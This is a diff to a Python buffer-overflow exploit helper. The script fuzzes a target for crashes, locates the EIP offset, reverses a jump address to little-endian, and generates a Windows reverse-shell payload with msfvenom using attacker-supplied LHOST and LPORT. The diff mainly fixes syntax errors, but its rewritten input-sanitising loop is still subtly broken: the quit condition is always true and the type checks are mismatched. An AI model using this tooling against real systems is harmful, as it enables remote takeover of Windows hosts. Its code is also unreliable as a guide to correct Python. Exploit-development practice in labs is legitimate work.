@@ -83,13 +83,12 @@ def endian_reverse(eip_reg_value):
         if response == 'cancel':
             exit(0)
         value_len = response
-    x = 1 if value_len == 4 else x = 2
+    x = 1 if value_len == 4 else 2
     b = f'{eip_reg_value[:x].lower()}'
     u = f'{eip_reg_value[x:2*x].lower()}'
     ff = f'{eip_reg_value[2*x:3*x].lower()}'
     er = f'{eip_reg_value[3*x:].lower()}'
-    reverse = f'{chr(int(er,16))}{chr(int(ff,16))}{chr(int(u,16))}{chr(int(b,16))}' if x == 2 else \
-        reverse = er + ff + u + b
+    reverse = f'{chr(int(er,16))}{chr(int(ff,16))}{chr(int(u,16))}{chr(int(b,16))}' if x == 2 else er + ff + u + b
     return reverse
 
 
@@ -154,17 +153,18 @@ def interactive_sanitize(_obj, _msg, _type):
     global _delimiter
     exit_option = f'[\'q\' to quit]'
     post_direction = f'Please try again.'
-    while _obj.lower() != 'q':
-        while not(isinstance(_obj, _type)):
-            try:
-                if _type == 'str':
-                    _obj = f'{_obj.lower()}'
-                elif _type == 'int':
-                    _obj = int(_obj)
-            except TypeError as error_message:
-                print(f'{_delimiter}\n[+] ERROR:\n[+]{error_message}\n{post_direction}\n{_delimiter}\n')
-                _obj = input(f'{_msg} {exit_option}\n')
-        if _type == 'alnum':
+    while _obj != 'q' or _obj != 'Q':
+        if _type == str or type == int:
+            while not(isinstance(_obj, _type)) and _obj.lower() != 'q':
+                try:
+                    if _type == 'str':
+                        _obj = f'{_obj.lower()}'
+                    elif _type == 'int':
+                        _obj = int(_obj)
+                except TypeError as error_message:
+                    print(f'{_delimiter}\n[+] ERROR:\n[+]{error_message}\n{post_direction}\n{_delimiter}\n')
+                    _obj = input(f'{_msg} {exit_option}\n')
+        elif _type == 'alnum':
             while not(_obj.isalnum()):
                 error_message = 'String input must be alphanumeric!. '
                 print(f'{_delimiter}\n[+] ERROR:\n[+]{error_message}\n{post_direction}\n{_delimiter}\n')
@@ -185,7 +185,7 @@ def test_ascii_at_offset(_offset):
     msg = 'Please input 4 ASCII Chars for testing offset: '
     test_chars = input(msg)
     while len(test_chars) != 4:
-        test_chars = interactive_sanitize(test_chars, msg, 'str')
+        test_chars = interactive_sanitize(test_chars, msg, str)
     a_buffer = 'A' * _offset
     b_buffer = f'{test_chars}'
     _buffer = []
@@ -304,7 +304,7 @@ def main():
     local_port = args.local_port
     char_length = args.char_length                                              # Defaults to 6000
     msg = f'The char_length value provided ({char_length}) is not an int. Enter another value for this variable.\n'
-    char_length = interactive_sanitize(char_length, msg, 'int')
+    char_length = interactive_sanitize(char_length, msg, int)
 
     # ****************************************************************************************
     # Loop through a buffer adding 100 char length to said buffer looking for a crash.
@@ -324,7 +324,7 @@ def main():
     elif response == 'n':
         char_length = starting_buffer_length
     error_message = 'The variable \'char_length\' must be an integer.'
-    char_length = interactive_sanitize(char_length, error_message, 'int')
+    char_length = interactive_sanitize(char_length, error_message, int)
 
     # ****************************************************************************************
     # Assuming you are this far, the crash and EIP overwrite have been confirmed.
@@ -364,7 +364,7 @@ def main():
     print(msg)
     msg = f'[?] Please re-enter or change the suggested offset (Suggested: {offset})\n'
     new_offset = input(msg)
-    offset = interactive_sanitize(new_offset, msg, 'int')
+    offset = interactive_sanitize(new_offset, msg, int)
     continue_msg()
 
     # ****************************************************************************************
@@ -410,7 +410,7 @@ def main():
             instr_address = input(msg).lower()
     instr_address = interactive_sanitize(instr_address, msg, 'hex')
     x = endian_reverse(instr_address)
-    le_instr_address = f'\x{x[3:4]}\x{x[2:3]}\x{x[1:2]}\x{x[0:1]}'
+    le_instr_address = f'\\x{x[3:4]}\\x{x[2:3]}\\x{x[1:2]}\\x{x[0:1]}'
     get_elapsed_time(start_time, 'loud')
     sys_command = f'msfvenom --payload windows/shell_reverse_tcp LHOST={local_ip} LPORT={local_port} ' \
                   f'EXITFUNC=thread -f c -a x86 --platform windows -b {"".join(_known_bad_chars)}'
